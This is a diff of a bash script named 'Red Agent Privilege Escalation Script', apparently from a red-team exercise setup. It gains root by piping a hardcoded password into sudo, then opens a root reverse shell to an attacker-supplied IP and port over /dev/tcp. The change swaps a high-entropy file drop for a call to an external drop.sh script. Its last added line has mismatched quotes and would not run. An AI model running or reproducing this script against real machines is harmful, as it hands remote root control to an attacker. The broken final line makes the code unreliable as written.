@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# Red Agent Privilege Escalation Script with High-Entropy File Dropping
+# Red Agent Privilege Escalation Script that invokes drop.sh
 
 if [ "$#" -ne 2 ]; then
     echo "Usage: $0 <attacker-ip> <attacker-port>"
@@ -13,29 +13,25 @@ attacker_port=$2
 
 echo "[*] Attempting privilege escalation..."
 
-# Try to escalate to root
+# Attempt privilege escalation with known password
 if printf '1234\n' | sudo -S whoami 2>/dev/null | grep -q root; then
     echo "[+] Privilege escalation successful."
 
-    # Generate a unique file name and file path
-    RAND_FILE="high_entropy_$(date +%s)_$RANDOM.bin"
-    FILE_PATH="/tmp/$RAND_FILE"
+    # Ensure drop.sh is executable
 
-    echo "[*] Creating high-entropy file at $FILE_PATH"
 
-    # Generate high-entropy content
-    base64 < /dev/urandom | head -c 2048 > "$FILE_PATH"
+    # printf '1234\n' | sudo -S ./drop.sh
 
-    # Confirm file creation
-    if [ -f "$FILE_PATH" ]; then
-        echo "[+] High-entropy file dropped: $FILE_PATH"
-    else
-        echo "[-] Failed to create high-entropy file."
-    fi
-
-    # Spawn reverse shell as root
+    # Optionally launch reverse shell as root
     echo "[*] Spawning reverse shell to $attacker_ip:$attacker_port ..."
     printf '1234\n' | sudo -S /bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"
 else
     echo "[!] Privilege escalation failed."
 fi
+
+chmod +x drop.sh
+
+RAND_FILE="drop_$(date +%s)_$RANDOM.bin"
+
+
+./drop.sh "0.8" "RAND_FILE="drop_$(date +%s)_$RANDOM.bin" 
